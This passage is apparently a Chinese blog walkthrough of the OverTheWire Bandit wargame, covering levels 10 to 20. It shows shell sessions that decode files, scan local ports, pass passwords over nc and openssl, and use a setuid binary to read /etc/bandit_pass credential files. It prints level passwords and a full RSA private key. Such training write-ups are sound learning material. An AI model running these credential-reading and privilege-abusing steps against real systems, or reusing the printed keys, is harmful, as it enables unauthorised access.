data.txt\nVGhlIHBhc3N3b3JkIGlzIElGdWt3S0dzRlc4TU9xM0lSRnFyeEUxaHhUTkViVVBSCg==\nbandit10@bandit:~$ base64 -d data.txt \nThe password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR\n```\n\n心路历程：题目告诉我们使用 base64 编码了数据，那我们解码就好了。\n\n---\n\nLevel 11 - 12\n\n描述：下一级的密码存储在文件data.txt中，其中所有小写（a-z）和大写（A-Z）字母已经被旋转了13个位置\n\n密码：5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu\n\n```sh\nbandit11@bandit:~$ ls\ndata.txt\nbandit11@bandit:~$ cat data.txt\nGur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh\nbandit11@bandit:~$ cat data.txt | tr 'a-zA-Z' 'n-za-mN-ZA-M'\nThe password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu\n```\n\n心路历程：这里我们用到了 `tr` 命令，参数为两个字符集，把第一个字符集中的字符替换为第二个字符集中的对应字符。题目中说旋转了13个位置，相当于26个字母前十三个和后十三个换了个位置。按照这样的对应关系，调整给出的字符集。\n提示：有人会写程序来做替换，但是对于这道题来讲 tr 会方便很多。虽然这个命令不常用，用起来还是很爽的。\n\n---\n\nLevel 12 - 13\n\n描述：下一级的密码存储在data.txt文件中，该文件是一个已被重复压缩的文件的十六进制转储文件。对于这个级别，可以在 `/tmp` 下使用 `mkdir` 创建一个工作的目录。例如：`mkdir /tmp/myname123` 。然后使用 `cp` 复制数据文件，并使用 `mv` 重命名（阅读manpages！）  \n密码：8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL\n\n```sh\nbandit12@bandit:~$ ls\ndata.txt\nbandit12@bandit:~$ mkdir /tmp/GeekaLeo123 ; cp data.txt /tmp/GeekaLeo123/data_1 ; cd /tmp/GeekaLeo123\nbandit12@bandit:/tmp/GeekaLeo123$ cat data_1 ; file data_1\n0000000: 1f8b 0808 5601 cd59 0203 6461 7461 322e  ....V..Y..data2.\n0000010: 6269 6e00 013f 02c0 fd42 5a68 3931 4159  bin..?...BZh91AY\n0000020: 2653 5914 13ca ff00 001b ffff faef 7fff  &SY.............\n0000030: f9fb a79e de5b efbb ffff fd7f cf7b fbff  .....[.......{..\n0000040: ff7f afbd 8ddb ff77 f752 ffff b001 3b56  .......w.R....;V\n0000050: 6100 01a3 d400 0000 0068 d0d0 69a0 0000  a........h..i...\n0000060: 007a 867a 9034 0340 6401 a340 0000 f280  .z.z.4.@d..@....\n0000070: 01ea 0d1a 1a1a 0d01 9034 0e40 0000 0686  .........4.@....\n0000080: 8d00 00c8 6819 3406 8d1e a003 d400 0c80  ....h.4.........\n0000090: f534 0034 309a 0006 83d4 0000 01a6 80c8  .4.40...........\n00000a0: 1900 6103 a01b 5034 69a1 a1a0 6868 3403  ..a...P4i...hh4.\n00000b0: 4341 a340 64f5 3400 0680 6801 a340 6800  CA.@d.4...h..@h.\n00000c0: 000d 0068 0340 00d0 01a1 a068 3430 3516  ...h.@.....h405.\n00000d0: 1543 1355 0d26 5d39 505d 970e fcac 9c37  .C.U.&]9P].....7\n00000e0: 0ec4 62b1 05bc 607b 68e4 c4f4 efa3 32f8  ..b...`{h.....2.\n00000f0: 6d9e 9c52 9d50 36a0 5598 b734 a0c4 7683  m..R.P6.U..4..v.\n0000100: 04e3 7cbd ec15 ea5d 1db8 1283 ea8b 4318  ..|....]......C.\n0000110: 0358 207a a12c 554f 4a2d 5428 eb47 6e7c  .X z.,UOJ-T(.Gn|\n0000120: ffdc 4018 60fc 0690 28ec 12b9 5d02 eecb  ..@.`...(...]...\n0000130: 11d4 e987 eb36 d574 e87c 2e67 f803 2cdf  .....6.t.|.g..,.\n0000140: b465 9110 302d a9c0 0c33 3e55 573c 8818  .e..0-...3>UW<..\n0000150: 76cf 6c6a 5efd c51e 20ec 2358 f5a8 694e  v.lj^... .#X..iN\n0000160: bc7a bc91 0376 ebc8 61a2 33c1 97e9 936d  .z...v..a.3....m\n0000170: df2b ceef 0a4f 6039 8cb5 b9cc d490 607b  .+...O`9......`{\n0000180: ff20 e253 1875 489a 0465 3643 497e 8348  . .S.uH..e6CI~.H\n0000190: 51dd d85e 5038 9c31 fcc3 bb2b 6157 0413  Q..^P8.1...+aW..\n00001a0: 7b90 6633 f706 0005 3dc0 7d9b f4ba b026  {.f3....=.}....&\n00001b0: 1a91 eca8 8423 7d1b 0401 d150 0c14 1fc5  .....#}....P....\n00001c0: ef57 ef39 3e53 dfc5 c2ce 29de 871f dce8  .W.9>S....).....\n00001d0: 2f85 3ff8 1f16 a894 6677 d26e a7b6 2550  /.?.....fw.n..%P\n00001e0: bc05 d2e6 51f8 d799 52f1 2783 a642 db4e  ....Q...R.'..B.N\n00001f0: 344f b1a4 608c 4249 20f6 549e 64db e2e8  4O..`.BI .T.d...\n0000200: 55da 10b5 adfc 28fd 1a8c 7e81 4188 5028  U.....(...~.A.P(\n0000210: 29ec ddf4 4bef 8de6 9a0b 0d49 14e7 d30e  )...K......I....\n0000220: 48a4 55b8 5729 7484 2900 e001 e451 7290  H.U.W)t.)....Qr.\n0000230: 057c f004 bb85 0788 0139 d730 8a08 0448  .|.......9.0...H\n0000240: 4a45 0565 243c 7017 9906 e644 ff8b b922  JE.e$<p....D...\"\n0000250: 9c28 480a 09e5 7f80 c978 5ff9 3f02 0000  .(H......x_.?...\ndata_1: ASCII text\nbandit12@bandit:/tmp/GeekaLeo123$ xxd -r data_1 > data_2 ; file data_2\ndata_2: gzip compressed data, was \"data2.bin\", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression\nbandit12@bandit:/tmp/GeekaLeo123$ mv data_2 data_3.gz ; gzip -d data_3.gz ; ls\ndata_1  data_3\nbandit12@bandit:/tmp/GeekaLeo123$ file data_3\ndata_3: bzip2 compressed data, block size = 900k\nbandit12@bandit:/tmp/GeekaLeo123$ mv data_3 data_4.bz2 ; bzip2 -d data_4.bz2 ; ls\ndata_1  data_4\nbandit12@bandit:/tmp/GeekaLeo123$ file data_4\ndata_4: gzip compressed data, was \"data4.bin\", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression\nbandit12@bandit:/tmp/GeekaLeo123$ mv data_4 data_5.gz ; gzip -d data_5.gz ; ls\ndata_1  data_5\nbandit12@bandit:/tmp/GeekaLeo123$ file data_5\ndata_5: POSIX tar archive (GNU)\nbandit12@bandit:/tmp/GeekaLeo123$ mv data_5 data_6.tar ; tar -xvf data_6.tar ; ls\ndata5.bin\ndata5.bin  data_1  data_6.tar\nbandit12@bandit:/tmp/GeekaLeo123$ file data5.bin \ndata5.bin: POSIX tar archive (GNU)\nbandit12@bandit:/tmp/GeekaLeo123$ mv data5.bin data_7.tar; tar -xvf data_7.tar ; ls \ndata6.bin\ndata6.bin  data_1  data_6.tar  data_7.tar\nbandit12@bandit:/tmp/GeekaLeo123$ file data6.bin\ndata6.bin: bzip2 compressed data, block size = 900k\nbandit12@bandit:/tmp/GeekaLeo123$ mv data6.bin data_8.bz2 ; bzip2 -d data_8.bz2 ; ls\ndata_1  data_6.tar  data_7.tar  data_8\nbandit12@bandit:/tmp/GeekaLeo123$ file data_8\ndata_8: POSIX tar archive (GNU)\nbandit12@bandit:/tmp/GeekaLeo123$ mv data_8 data_9.tar ; tar -xvf data_9.tar ; ls\ndata8.bin\ndata8.bin  data_1  data_6.tar  data_7.tar  data_9.tar\nbandit12@bandit:/tmp/GeekaLeo123$ file data8.bin\ndata8.bin: gzip compressed data, was \"data9.bin\", from Unix, last modified: Thu Sep 28 14:04:06 2017, max compression\nbandit12@bandit:/tmp/GeekaLeo123$ mv data8.bin data_10.gz ; gzip -d data_10.gz ; ls\ndata_1  data_10  data_6.tar  data_7.tar  data_9.tar\nbandit12@bandit:/tmp/GeekaLeo123$ file data_10\ndata_10: ASCII text\nbandit12@bandit:/tmp/GeekaLeo123$ cat data_10\nThe password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL\n```\n\n心路历程：这关比较恶心了……按照对应的加密方式解密就好，用 `file` 查看文件类型，`mv` 命令修改名字，还有`bzip2 -d`、`gzip -d`、`tar -xvf`以及`xxd -r` 这些解密解压方法。\n\n---\n\nLevel 13 - 14\n\n描述：下一级的密码存储在`/etc/bandit\\_pass/bandit14` 中，只能由用户bandit14读取。对于这个级别，你不会得到下一个密码，但你会得到一个私人的SSH密钥，可以用来登录到下一个级别。注意：localhost是指您正在使用的机器的主机名  \n密码：4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e\n\n```sh\nbandit13@bandit:~$ ls\nsshkey.private\nbandit13@bandit:~$ ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220\nThe authenticity of host '[bandit.labs.overthewire.org]:2220 ([0.0.0.0]:2220)' can't be established.\nECDSA key fingerprint is ee:4c:8c:e7:57:2c:bc:63:24:b8:e6:23:27:63:72:9f.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '[bandit.labs.overthewire.org]:2220,[0.0.0.0]:2220' (ECDSA) to the list of known hosts.\n...\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\nbandit14@bandit:~$ cat /etc/bandit_pass/bandit14  \n4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e\n```\n\n心路历程：告诉我们需要 ssh 登陆进去，自己去找密码，我们就登录一下好了。\n\n---\n\nLevel 14 - 15\n描述：通过将当前级别的密码提交到localhost上的端口30000，可以检索到下一级别的密码。\n密码：BfMYroe26WYalil77FoDi9qh59eK5xNr\n\n```sh\nbandit14@bandit:~$ nc localhost 30000 < /etc/bandit_pass/bandit14\nCorrect!\nBfMYroe26WYalil77FoDi9qh59eK5xNr\n```\n\n心路历程：我们使用 `nc` 命令来发送我们的密码，因为上一关我们已经知道密码在那放着了，刚好可以用到。\n提示：什么？你想直接查看其他关的密码？不存在的……（权限啊老铁）\n\n---\n\nLevel 15 -16\n\n描述：可以通过使用SSL加密将当前级别的密码提交到本地主机上的端口30001来检索下一级别的密码。\n\n密码：\n\n```sh\nbandit15@bandit:~$ openssl s_client -connect localhost:30001 -ign_eof                          \nCONNECTED(00000003)\ndepth=0 CN = 8f75dc271013\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = 8f75dc271013\nverify return:1\n---\nCertificate chain\n 0 s:/CN=8f75dc271013\n   i:/CN=8f75dc271013\n---\nServer certificate\n-----BEGIN CERTIFICATE-----\nMIICvjCCAaagAwIBAgIJALADbwWQ0u9aMA0GCSqGSIb3DQEBCwUAMBcxFTATBgNV\nBAMTDDhmNzVkYzI3MTAxMzAeFw0xNzA5MTYwNzAyMjRaFw0yNzA5MTQwNzAyMjRa\nMBcxFTATBgNVBAMTDDhmNzVkYzI3MTAxMzCCASIwDQYJKoZIhvcNAQEBBQADggEP\nADCCAQoCggEBALmjBUTlmjROJUssm+rAlFADFfzrz+xCH0qUXryou5/wW8pnQ6nG\nHbdeRIBwTVGFiDIKRbFdWQU4BbrfjEhyGn9d7eh/3GV09ZdvLDYRoLmJ4tDF8CiC\nwGl9GufcWr3zeaNYa8CwVdtWam8umhMICrsv7B5iV9RdSQfudUtVbr26SBVyuhBm\nm0t7Su6rLCrrGtshdIihjk4k67bBMpSNAOduhpp79UgIPKcwJUhRJHTcji3m/IQ8\nO9zNS25oL8KhMn7e/Xe70kztstq0ShMsx8feutONnGulUOlaEMMqW+HSWgnVeG/r\nmU9Nzwn++4qxe16OvvmXAzctH2RlDx7XbcsCAwEAAaMNMAswCQYDVR0TBAIwADAN\nBgkqhkiG9w0BAQsFAAOCAQEADHODX5CcMLI5fdumzly5FAVg5Yc22eDGNhmyhi/N\nkDhP6QYw+HW5nWEYapc9m/ZQGEEoxr+wj6qeEhscxRxpuEIcunZsLKcoAmToyXeO\nANMslQugRcGqN57Pt0h5VuctLMa3ickeVPFvV6gxJSHBNRK1iN8nrfsy+zR+stzI\nxcjIuakDDxMKFtb/1TMKf4/EsimSQLS0WXLjbxfQ/J510O4/Of0tmZI0ZIG+cKmM\nV5hAOtuuAk6jREfWYJQ3DB+phv7PO9s2FpofVJss5PK4NWDS7UQOv359ZOJ85ZpJ\nihGxDqV7IAHJZNM9lvFXz/+EOn1oTGW9V8bAwt34OVYoPw==\n-----END CERTIFICATE-----\nsubject=/CN=8f75dc271013\nissuer=/CN=8f75dc271013\n---\nNo client certificate CA names sent\n---\nSSL handshake has read 1682 bytes and written 637 bytes\n---\nNew, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA\nServer public key is 2048 bit\nSecure Renegotiation IS supported\nCompression: NONE\nExpansion: NONE\nSSL-Session:\n    Protocol  : SSLv3\n    Cipher    : DHE-RSA-AES256-SHA\n    Session-ID: C193C0A99C7335DB7D7B7B89367CF5E6A514E4FF58066E86A47070BCD02F7BC5\n    Session-ID-ctx: \n    Master-Key: 5D0EB4E12667C302D7D9AAB88855BF67DA51124248593FC4B5613C6BBCF69C145BF0B37DCA5A3765A8DFD2EBDC84B248\n    Key-Arg   : None\n    PSK identity: None\n    PSK identity hint: None\n    SRP username: None\n    Start Time: 1510423808\n    Timeout   : 300 (sec)\n    Verify return code: 18 (self signed certificate)\n---\nBfMYroe26WYalil77FoDi9qh59eK5xNr\nCorrect!\ncluFn7wTiGryunymYOu4RcffSxQluehd\n\nread:errno=0\n```\n\n心路历程：我们使用 `openssl` 的 `s\\_client` SSL/TSL 客户端程序连接服务器，成功后复制粘贴我们本关的密码就能得到下一关的密码了。多看手册哦。\n提示：\n```bash\nbandit15@bandit:~$ man openssl\nbandit15@bandit:~$ man s_client\n```\n\n---\n\nLevel 16 -17\n描述：可以通过将当前级别的密码提交到本地主机上31000到32000范围内的端口来检索下一级别的凭证。首先找出哪些端口有服务器正在侦听它们。然后找出哪些人说SSL和哪些不。只有一个服务器会提供下一个凭据，其他的只是发回你发给它的内容。\n密码：xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn\n\n```sh\n# 先扫描开放端口\nbandit16@bandit:~$ nmap -p 31000-32000 localhost\n\nStarting Nmap 6.40 ( http://nmap.org ) at 2017-11-12 09:08 UTC\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.00047s latency).\nOther addresses for localhost (not scanned): 127.0.0.1\nNot shown: 996 closed ports\nPORT      STATE SERVICE\n31046/tcp open  unknown\n31518/tcp open  unknown\n31691/tcp open  unknown\n31790/tcp open  unknown\n31960/tcp open  unknown\n\n# 依次给5个端口发送消息,其他端口只会返回你发给它的内容。\nbandit16@bandit:~$ echo \"Hello World!\" | nc localhost 31046    \nHello World!\nbandit16@bandit:~$ echo \"Hello World!\" | nc localhost 31518\nERROR\n140737354053280:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:351:\nbandit16@bandit:~$ echo \"Hello World!\" | nc localhost 31691\nHello World!\nbandit16@bandit:~$ echo \"Hello World!\" | nc localhost 31790\nERROR\n140737354053280:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:351:\nbandit16@bandit:~$ echo \"Hello World!\" | nc localhost 31960\nHello World!\n\n# 我们发现有两个端口是SSL的，分别给这两个端口发送数据测试。\nbandit16@bandit:~$ echo \"Hello World\" | openssl s_client -quiet -connect localhost:31518\ndepth=0 CN = 8f75dc271013\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = 8f75dc271013\nverify return:1\nHello World\n# 因为回复了Hello World，确定这个属于「其他端口」这里直接发送密码给 31790 端口\nbandit16@bandit:~$ cat /etc/bandit_pass/bandit16 | openssl s_client -quiet -connect localhost:31790\ndepth=0 CN = 8f75dc271013\nverify error:num=18:self signed certificate\nverify return:1\ndepth=0 CN = 8f75dc271013\nverify return:1\nCorrect!\n-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ\nimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ\nJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu\nDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW\nJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX\nx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD\nKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl\nJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd\nd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC\nYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A\nvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama\n+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT\n8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx\nSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd\nHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt\nSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A\nR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi\nTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg\nR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu\nL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni\nblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU\nYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM\n77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b\ndxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3\nvBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=\n-----END RSA PRIVATE KEY-----\n\nread:errno=0\n\n# 存到文件中\nbandit16@bandit:~$ echo \"-----BEGIN RSA PRIVATE KEY-----\n> MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ\n> imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ\n> Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu\n> DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW\n> JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX\n> x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD\n> KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl\n> J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd\n> d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC\n> YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A\n> vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama\n> +TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT\n> 8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx\n> SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd\n> HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt\n> SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A\n> R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi\n> Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg\n> R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu\n> L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni\n> blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU\n> YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM\n> 77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b\n> dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3\n> vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=\n> -----END RSA PRIVATE KEY-----\" > ssh.private\n\n# 修改文件权限，确保他人不被允许访问这个文件，不然不会被认证端认同\nbandit16@bandit:~$ chmod 600 ssh.private\n\n# 连接\nbandit16@bandit:~$ ssh -i ssh.private bandit17@localhost -p 2220\n _                     _ _ _   \n| |__   __ _ _ __   __| (_) |_ \n| '_ \\ / _` | '_ \\ / _` | | __|\n| |_) | (_| | | | | (_| | | |_ \n|_.__/ \\__,_|_| |_|\\__,_|_|\\__|\n                               \na http://www.overthewire.org wargame.\n\n...\nbandit17@bandit:~$ cat /etc/bandit_pass/bandit17\nxLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn\n```\n\n心路历程：这关把过程注释在了上面的代码中，帮助大家路顺思路，这里就不赘述了。\n\n---\n\nLevel 17 -18\n\n描述：homedirectory中有两个文件：passwords.old和passwords.new。下一级的密码是passwords.new中跟.old唯一不同的一行\n\n密码：kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd\n\n```sh\nbandit17@bandit:~$ ll\ntotal 44\ndrwxr-xr-x  4 bandit17 bandit17 4096 Nov 12 10:42 ./\ndrwxr-xr-x 30 root     root     4096 Nov 12 10:42 ../\n-rw-r-----  1 bandit17 bandit17   33 Sep 28 14:04 .bandit16.password\n-rw-r--r--  1 bandit17 bandit17  220 Apr  9  2014 .bash_logout\n-rw-r--r--  1 bandit17 bandit17 3637 Apr  9  2014 .bashrc\ndrwx------  2 bandit17 bandit17 4096 Nov 12 10:42 .cache/\n-rw-r--r--  1 bandit17 bandit17  675 Apr  9  2014 .profile\ndrwxr-xr-x  2 root     root     4096 Sep 28 14:04 .ssh/\n-rw-r-----  1 bandit17 bandit17 1704 Sep 28 14:04 .ssl-cert-snakeoil.key\n-rw-r-----  1 bandit18 bandit17 3300 Sep 28 14:04 passwords.new\n-rw-r-----  1 bandit18 bandit17 3300 Sep 28 14:04 passwords.old\nbandit17@bandit:~$ diff passwords.old passwords.new\n42c42\n< R3GQabj3vKRTcjTTISWvO1RJWc5sqSXO\n---\n> kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd\n```\n\n心路历程：描述说的很清晰，这里直接 diff 就好了。\n\n---\n\nLevel 18 -19\n\n描述：下一级别的密码存储在家庭目录中的 readme 文件中。不幸的是，当你用SSH登录时，有人修改了.bashrc将你注销。\n\n密码：IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x\n\n这里就厉害了……\n![IMAGE](/Image/bandit_resources/5C57A9F0545D1CDEA58442EEDC952A51.jpg)\n输入密码后，跟我说了句拜拜然后给我一脚……\n卧槽忍不了。\n常年看 man 手册的老司机表示年轻人要低调，密码我还是能拿到。\n先看 `man ssh` 说了什么：\n![IMAGE](/Image/bandit_resources/5750971C77CDE09AD8C9ED4D020D4701.jpg)\nSecure Shell 中的配置页面也预留了 Command 配置:\n![IMAGE](/Image/bandit_resources/AD0B25D055288B2474EDD87D747BCF9F.jpg)\n配置好之后点连接，输入密码：\n```bash\n _                     _ _ _   \n| |__   __ _ _ __   __| (_) |_ \n| '_ \\ / _` | '_ \\ / _` | | __|\n| |_) | (_| | | | | (_| | | |_ \n|_.__/ \\__,_|_| |_|\\__,_|_|\\__|\n                               \na http://www.overthewire.org wargame.\n\nbandit18@bandit.labs.overthewire.org's password: \nIueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x\n```\n\n心路历程：如果事先不知道，卡住是正常的，但是如果之前用到 `ssh` 命令的时候仔细看看 man 手册，不知道吗？不存在的……\n该反省的反省。\n\n--- \n\nLevel 19 - 20\n\n描述：要访问下一个级别，您应该使用homeu目录中的setuid二进制文件。 不带参数的执行它找出如何使用它。 在使用setuid二进制文件后，可以在通常的地方（/etc/bandit\\_pass）找到这个级别的密码。\n\n密码：GbKksEFF4yrVs6il55v6gwY5aVje5f0j\n\n说实话我没抬读懂这个 setuid binary，不过不影响。大致意思就是告诉你 Home 目录下有个文件，先不带参数执行一下，他会告诉你怎么用。\n\n```sh\n\nbandit19@bandit:~$ ll\ntotal 32\ndrwxr-xr-x  3 bandit19 bandit19 4096 Nov 12 11:30 ./\ndrwxr-xr-x 30 root     root     4096 Nov 12 11:30 ../\n-rw-r--r--  1 bandit19 bandit19  220 Apr  9  2014 .bash_logout\n-rw-r--r--  1 bandit19 bandit19 3637 Apr  9  2014 .bashrc\ndrwx------  2 bandit19 bandit19 4096 Nov 12 11:30 .cache/\n-rw-r--r--  1 bandit19 bandit19  675 Apr  9  2014 .profile\n-rwsr-x---  1 bandit20 bandit19 7378 Sep 28 14:04 bandit20-do*\n# 看起来就是bandit20-do了\nbandit19@bandit:~$ ./bandit20-do \nRun a command as another user.\n  Example: ./bandit20-do id\nbandit19@bandit:~$ ./bandit20-do\n# 人家已经告诉你了，会使用另一个用户执行命令，再返回去看一眼她的权限 -rwsr-x---\nbandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20\nGbKksEFF4yrVs6il55v6gwY5aVje5f0j\n```\n\n心路历程：嗯，有种报复社会的感觉。\n\n---\n\nLevel 20 -21\n\n描述：homedirectory中有一个setuid二进制文件，它执行以下操作：它将连接 localhost:[命令行参数的上的端口]。然后从连接中读取一行文本，并将其与上一级（bandit20）中的密码进行比较。如果密码正确，将传送下一级密码（bandit21）。\n\n注意：基础设施的变化使这一层面更加困难。您将需要找出在同一个Docker实例中启动多个命令的方法。\n\n密码：gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr\n\n这关的大意呢是告诉你，你的 Home 目录下有一个二进制文件（setuid又出现了……），你执行它，并提供给它端口号，它会请求这个端口并获取这个端口提供给他的数据，如果数据和 bandit20 的密码相同，他就会告诉你下一关的密码。\n并且给了注意事项:[Changes to the infrastructure](http://overthewire.org/help/sshinfra.html)。\n注意事项中提到了他们的游戏是运行在 Docker 容器上的，默认会给每一次连接分配一个全新的环境，如果当你完成游戏需要开启两个终端 并会产生交互的话，可能需要一些特殊的手段（ssh -L localport:host:port），我们后面再讲这个操作，先分析下他要我们干什么。\n\n他提到：这个程序会访问 localhost 的[你提供的端口号]来获取数据。这里我们需要处理两件事情：1.运行这个程序。2.创建一个监听事件并会回复这个程序当前关的密码。\n监听端口与访问端口有可能用到两个终端，而且是存在交互的，这也是他给我们提示的初衷。\n我们做这关呢，有两个解法。一个是本着学习的态度，走提示流程，一个是日常野路子解法。我们先说说提示的思路。\n\n### 思路一：\n这个跑在 Docker 容器内的游戏，每一次连接都是全新的环境，那我们一个监听，一个请求，需要保证两个终端能够通信，监听的一段正常监听，请求的一端再去请求。所以我们现在要创建两个能交互的终端。方法是借助 `ssl -L` 这个命令，先查一下这个命令。然后再看会好很多。\n嗯……先给你3分钟查一查，不够的话再来3分钟也行……\n\n![IMAGE](/Image/bandit_resources/9D5E08F5F93CA44BC4287F54BD6661FC.jpg)\n拿实际例子来说，当我们这样配置并连接的时候，我们请求连接本地主机的 1234 端口时这个请求会转发到 `bandit.labs.overthewire.org`，它会来访问 `localhost` (此时，对于 `bandit.labs.overthewire.org` 来讲 `localhost` 是它自身)的 22 端口。\n注意事项中告诉我们，这样就可以在提供 -L 参数的这个连接不关闭的情况下，通过本地端口转发，建立另一条连接并能够与前一个连接搞基。\n\n那我们的第二个连接就是这样的：\n![IMAGE](/Image/bandit_resources/CA9CFE5E31145E899BB4D6AD535E8B21.jpg)\n\n我们在其中一个终端中创建一个发送本关密码的监听：\n```bash\nbandit20@bandit:~$ nc -l 23333 < /etc/bandit_pass/bandit20\n 